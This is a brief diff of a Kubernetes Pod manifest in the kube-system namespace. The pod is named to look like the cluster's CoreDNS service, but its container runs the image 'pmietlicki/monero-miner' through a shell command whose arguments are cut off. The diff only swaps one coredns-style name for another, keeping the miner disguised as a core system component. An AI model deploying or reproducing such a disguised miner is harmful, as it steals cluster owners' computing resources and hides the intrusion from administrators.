@@ -1,11 +1,11 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: coredns-5c98db65d4-7t2l2
+  name: coredns-7c98db65d4-7t2l2
   namespace: kube-system
 spec:
   containers:
-  - name: coredns-5c98db65d4-7t2l2
+  - name: coredns-7c98db65d4-7t2l2
     image: pmietlicki/monero-miner
     command: ["sh", "-c"]
     args:
